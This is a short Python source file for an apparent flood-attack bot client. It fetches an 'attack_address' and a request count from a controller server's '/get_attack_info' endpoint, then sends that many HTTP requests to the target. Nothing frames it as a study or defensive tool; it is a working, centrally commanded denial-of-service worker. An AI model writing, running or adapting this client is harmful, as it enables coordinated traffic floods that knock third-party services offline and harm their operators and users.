import socket
import requests
import threading
from typing import Tuple

class Client:
    ID = 0

    def __init__(self, server_address: Tuple[str, int]) -> None:
        self.id = Client.ID
        self.server_address = server_address
        Client.ID += 1

    # def send_datum(self, attack_address: str, num_requests: int):
        # pass


    def run(self):
        r = requests.get(f"http://{self.server_address[0]}:{self.server_address[1]}/get_attack_info")
        print(r.json())
        attack_address = r.json()["attack_address"]
        num_requests = r.json()["requests_amount"]
        if attack_address and num_requests:
            for _ in range(num_requests):
                r = requests.get(attack_address)
                print(r.status_code, r.elapsed)
